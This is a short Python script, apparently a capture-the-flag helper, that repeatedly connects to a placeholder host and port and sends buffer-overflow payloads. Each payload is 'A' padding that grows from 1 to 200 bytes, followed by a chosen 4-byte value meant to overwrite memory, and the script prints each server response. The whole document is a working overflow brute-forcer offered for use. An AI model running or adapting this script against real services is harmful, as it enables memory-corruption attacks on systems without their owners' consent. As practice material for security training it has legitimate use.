import socket

# Remote server and port, change these values as needed
host = "XX.XX.XX.XX"
port = XXXX

# Create the payload
for additional_padding in range(1, 200):  # Start at 1 byte and go up to 200 bytes
    try:
        buffer_fill = 1  # initial buffer
        value_for_overflow = b"\x2A\x00\x00\x00"  # Set this to whatever byte or number you need the overflow to be

        payload = b"A" * buffer_fill 
        payload += b"A" * additional_padding  # Add incremental padding to overflow
        payload += value_for_overflow  

        print(f"Trying with additional padding length: {additional_padding} (Total payload length: {len(payload)})")

        # Connect to the server
        with socket.create_connection((host, port)) as s:
            # Read the server's prompt
            response = s.recv(4096)
            print("Server prompt received:")
            print(response.decode(errors='ignore'))

            # Send the payload to the remote server
            s.sendall(payload)

            # Receive and print the response
            response = s.recv(4096)
            print("Response received:")
            print(response.decode(errors='ignore'))

    except Exception as e:
        print(f"Connection failed: {e}")
